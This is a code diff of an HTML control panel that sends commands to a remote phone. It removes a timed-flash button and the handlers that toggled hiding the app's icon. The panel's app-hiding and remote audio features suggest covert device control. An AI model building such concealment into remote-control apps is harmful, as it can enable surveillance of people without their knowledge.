@@ -634,7 +634,6 @@
         <button onclick="sendCommand('VIBRATE', { duration: 1000 })"><span>📳</span> Vibrate (1s)</button>
         <button onclick="sendCommand('FLASH_ON')"><span>🔦</span> Flash On</button>
         <button onclick="sendCommand('FLASH_OFF')"><span>🔦</span> Flash Off</button>
-        <button onclick="sendCommand('FLASH_TIMED', { duration: 5000 })"><span>⏱️</span> Flash 5s</button>
         <button onclick="sendCommand('FLASH_BLINK', { duration: 10000, interval: 500 })"><span>✨</span> Flash Blink</button>
         <button onclick="showFirebaseSettingsPanel()" style="border-left:3px solid #ff6f00"><span>🔥</span> Firebase Setup</button>
     </div>
@@ -1696,18 +1695,7 @@
             showAudio(msg.substring(16));
             pendingCommand = null;
             
-        } else if (msg.startsWith("APP_HIDDEN")) {
-            iconHidden = true;
-            document.getElementById('iconBtn').innerText = 'Show Icon';
-            showNotification('App icon hidden');
-            pendingCommand = null;
-        }
-        else if (msg.startsWith("APP_SHOWN")) {
-            iconHidden = false;
-            document.getElementById('iconBtn').innerText = 'Hide Icon';
-            showNotification('App icon shown');
-            pendingCommand = null;
-        } else if (msg.startsWith("FLASH_ON")) {
+        }  else if (msg.startsWith("FLASH_ON")) {
             showNotification('🔦 Flashlight ON');
             pendingCommand = null;
             
